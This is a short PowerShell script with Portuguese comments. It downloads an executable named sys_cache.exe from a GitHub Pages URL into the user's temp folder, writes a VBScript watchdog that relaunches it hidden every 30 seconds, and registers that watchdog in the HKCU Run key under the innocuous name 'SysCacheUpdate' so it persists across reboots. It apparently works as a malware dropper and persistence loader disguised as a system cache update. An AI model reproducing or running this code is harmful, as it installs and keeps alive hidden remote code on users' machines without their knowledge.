$dir = "$env:TEMP\sys_cache"
if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }

# Baixa o executável diretamente
Invoke-WebRequest -Uri "https://syslog992.github.io/sys-cache-update/sys_cache.exe" -OutFile "$dir\sys_cache.exe"

# Guardião VBS para garantir que o .exe esteja sempre rodando
$vbs = @"
Set WshShell = CreateObject("WScript.Shell")
Do
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'sys_cache.exe'")
    If colProcesses.Count = 0 Then
        WshShell.Run "$dir\sys_cache.exe", 0, False
    End If
    WScript.Sleep 30000
Loop
"@
$vbs | Out-File -FilePath "$dir\guardiao.vbs" -Encoding ASCII

# Persistência no Registro
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "SysCacheUpdate" -Value "wscript.exe $dir\guardiao.vbs"

# Inicia o Guardião
Start-Process "wscript.exe" "$dir\guardiao.vbs"
